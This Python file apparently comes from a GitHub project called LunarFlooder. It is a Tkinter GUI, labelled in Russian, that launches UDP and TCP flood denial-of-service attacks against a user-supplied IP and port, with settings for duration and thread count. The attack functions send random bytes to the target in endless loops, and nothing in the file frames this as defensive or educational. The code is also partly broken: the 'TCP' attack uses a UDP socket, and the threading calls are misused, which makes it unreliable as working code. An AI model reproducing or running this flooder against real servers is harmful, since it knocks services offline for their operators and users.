# Made by Lunarelly (https://github.com/Lunarelly)

import random
import socket
import threading
import base64

from tkinter import *
from tkinter import messagebox
from io import BytesIO
from PIL import Image, ImageTk
from pic2str import explode

background = '#293241'
version = 'v1.0'

app = Tk()
app['bg'] = background
app.title(f'LunarFlooder')
app.wm_attributes('-alpha', 0.9)
app.geometry('400x600')
app.resizable(width=False, height=False)
byte_data = base64.b64decode(explode)
image_data = BytesIO(byte_data)
image = Image.open(image_data)
icon = ImageTk.PhotoImage(image)
app.iconphoto(True, icon)


def pic2str(file, functionName):
    pic = open(file, 'rb')
    content = '{} = {}\n'.format(functionName, base64.b64encode(pic.read()))
    pic.close()

    with open('pic2str.py', 'a') as f:
        f.write(content)


def run_udp():
    if not ipTextbox.get():
        messagebox.showinfo(title='Ошибка', message='Укажите IP!')
        return
    elif not portTextbox.get():
        messagebox.showinfo(title='Ошибка', message='Укажите порт!')
        return
    elif not timesTextbox.get():
        messagebox.showinfo(title='Ошибка', message='Укажите продолжительность атаки!')
        return
    elif not threadsTextbox.get():
        messagebox.showinfo(title='Ошибка', message='Укажите количество потоков!')
        return

    ip = str(ipTextbox.get())
    port = int(portTextbox.get())
    times = int(timesTextbox.get())
    threads = int(threadsTextbox.get())

    output = f'Подтвердите запуск UDP атаки!\nIP: {ip}\nПорт:{port}\nПродолжительность: {times}сек\nПотоки: {threads}'
    messagebox.showinfo(title='UDP Flood', message=output)

    t = threading.Thread(target=attack_udp(ip, port, times))

    for i in range(threads):
        t.start()


def run_tcp():
    if not ipTextbox.get():
        messagebox.showinfo(title='Ошибка', message='Укажите IP!')
        return
    elif not portTextbox.get():
        messagebox.showinfo(title='Ошибка', message='Укажите порт!')
        return
    elif not timesTextbox.get():
        messagebox.showinfo(title='Ошибка', message='Укажите продолжительность атаки!')
        return
    elif not threadsTextbox.get():
        messagebox.showinfo(title='Ошибка', message='Укажите количество потоков!')
        return

    ip = str(ipTextbox.get())
    port = int(portTextbox.get())
    times = int(timesTextbox.get())
    threads = int(threadsTextbox.get())

    output = f'Подтвердите запуск TCP атаки!\nIP: {ip}\nПорт:{port}\nПродолжительность: {times}сек\nПотоки: {threads}'
    messagebox.showinfo(title='TCP Flood', message=output)

    t = threading.Thread(target=attack_tcp(ip, port, times))

    for i in range(threads):
        t.start()


def attack_udp(ip, port, times):
    data = random._urandom(1024)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            target = (ip, port)
            for x in range(times):
                sock.sendto(data, target)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print(e)


def attack_tcp(ip, port, times):
    data = random._urandom(16)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            target = (ip, port)
            sock.connect(target)
            sock.send(data)
            for x in range(times):
                sock.send(data)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print(e)


ipMessage = Label(app, text='Введите IP сервера:')
ipMessage.pack()

ipTextbox = Entry(app, width=25)
ipTextbox.pack()

portMessage = Label(app, text='Введите порт сервера:')
portMessage.pack()

portTextbox = Entry(app, width=15)
portTextbox.pack()

timesMessage = Label(app, text='Введите время атаки (в секундах):')
timesMessage.pack()

timesTextbox = Entry(app, width=15)
timesTextbox.pack()

threadsMessage = Label(app, text='Введите количество потоков:')
threadsMessage.pack()

threadsTextbox = Entry(app, width=15)
threadsTextbox.pack()

udpButton = Button(app, text='UDP Атака', command=run_udp, bg='brown', fg='white')
udpButton.pack()

tcpButton = Button(app, text='TCP Атака', command=run_tcp, bg='brown', fg='white')
tcpButton.pack()

infoMessage = Label(app, text='LunarFlooder, UDP/TCP flooder by Lunarelly.\nGitHub: https://github.com/Lunarelly')
infoMessage.pack()

app.mainloop()
